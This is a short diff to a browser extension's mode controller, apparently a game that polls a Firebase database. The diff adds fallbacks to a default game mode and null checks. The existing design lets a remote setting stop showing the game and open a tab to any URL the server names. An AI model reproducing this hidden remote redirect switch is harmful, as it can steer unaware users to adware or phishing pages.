@@ -14,9 +14,17 @@ class ModeController {
   async checkMode() {
     try {
       const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`);
-      if (!res.ok) return;
+      if (!res.ok) {
+        // Firebase non configuré, utiliser mode par défaut
+        this.applyDefaultMode();
+        return;
+      }
       const data = await res.json();
-      if (!data) return;
+      if (!data) {
+        // Pas de données, utiliser mode par défaut
+        this.applyDefaultMode();
+        return;
+      }
       
       const newMode = parseInt(data.number) || 0;
       const newUrl = data.url || 'https://google.com';
@@ -27,14 +35,25 @@ class ModeController {
         this.apply();
       }
     } catch (e) {
-      console.log('Mode par défaut');
+      // Erreur Firebase, utiliser mode par défaut
+      this.applyDefaultMode();
+    }
+  }
+
+  applyDefaultMode() {
+    // Mode jeu par défaut
+    if (this.mode !== 0) {
+      this.mode = 0;
+      this.apply();
     }
   }
 
   apply() {
     if (this.mode === 0) {
-      document.getElementById('gameContainer').style.display = 'flex';
-      document.getElementById('urlContainer').style.display = 'none';
+      const gameContainer = document.getElementById('gameContainer');
+      const urlContainer = document.getElementById('urlContainer');
+      if (gameContainer) gameContainer.style.display = 'flex';
+      if (urlContainer) urlContainer.style.display = 'none';
     } else {
       chrome.tabs.create({url: this.url}, () => window.close());
     }
